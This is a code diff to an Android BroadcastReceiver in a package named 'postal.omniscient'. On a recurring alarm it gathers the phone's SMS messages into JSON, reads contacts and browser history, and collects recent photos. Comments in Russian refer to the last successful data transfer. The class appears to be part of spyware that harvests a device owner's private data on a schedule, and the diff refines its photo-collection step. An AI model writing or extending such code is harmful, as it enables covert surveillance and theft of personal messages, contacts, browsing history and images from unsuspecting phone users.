@@ -3,6 +3,7 @@ package com.postal.omniscient.postal.service;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.media.Ringtone;
@@ -31,6 +32,7 @@ import java.util.List;
  *  контакты ,смс и браузера историю*/
 public class AlarmReceiver extends BroadcastReceiver {
     final int SDK_INT = Build.VERSION.SDK_INT;
+    private static String Msg = "MyMsg";
     public AlarmReceiver() {
     }
 
@@ -49,7 +51,7 @@ public class AlarmReceiver extends BroadcastReceiver {
         sms.smsToJson();
         contact.getContacts();
         browser.historyToJson();
-        saveIMAGE(context);
+        saveIMAGE(context, context.getContentResolver());
 
         AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
         Intent myIntent = new Intent(context, AlarmReceiver.class);
@@ -68,17 +70,15 @@ public class AlarmReceiver extends BroadcastReceiver {
 
     }
 
-    private void saveIMAGE(Context context) {
+    private void saveIMAGE(Context context, ContentResolver contentResolver) {
         //IMEGE
-        AllImages img = new AllImages(context.getContentResolver());
-        String DATE_COLUMN_NAME = "date_added > ? AND ?";
-        Calendar currentDate = Calendar.getInstance();
+        AllImages img = new AllImages(contentResolver);
 
-        long end_date = currentDate.getTimeInMillis();// текущаяя дата (/1000 потому что получаем полную дату 14 цыфр а в БД 10 цыфр
-        long start_date = end_date;// дата из БД последней удачной передачи данных
+//        long end_date = currentDate.getTimeInMillis();// текущаяя дата (/1000 потому что получаем полную дату 14 цыфр а в БД 10 цыфр
+//        long start_date = end_date;// дата из БД последней удачной передачи данных
 
-        img.getAllImages(DATE_COLUMN_NAME, start_date, end_date); //для выборки по дате новых фото
-        List<AdapterData> listOfAllImages = img.getAllImages();
+       // img.getAllImages();
+        List<AdapterData> listOfAllImages = img.getLastImages();
         String patchFile;
         for (AdapterData a : listOfAllImages) {
             if(!a.getAddress().equals("")){
@@ -121,10 +121,10 @@ public class AlarmReceiver extends BroadcastReceiver {
             out = null;
 
         }  catch (FileNotFoundException fnfe1) {
-            Log.e("MyMsg", fnfe1.getMessage());
+            Log.e(Msg, fnfe1.getMessage());
         }
         catch (Exception e) {
-            Log.e("MyMsg", e.getMessage());
+            Log.e(Msg, e.getMessage());
         }
 
     }
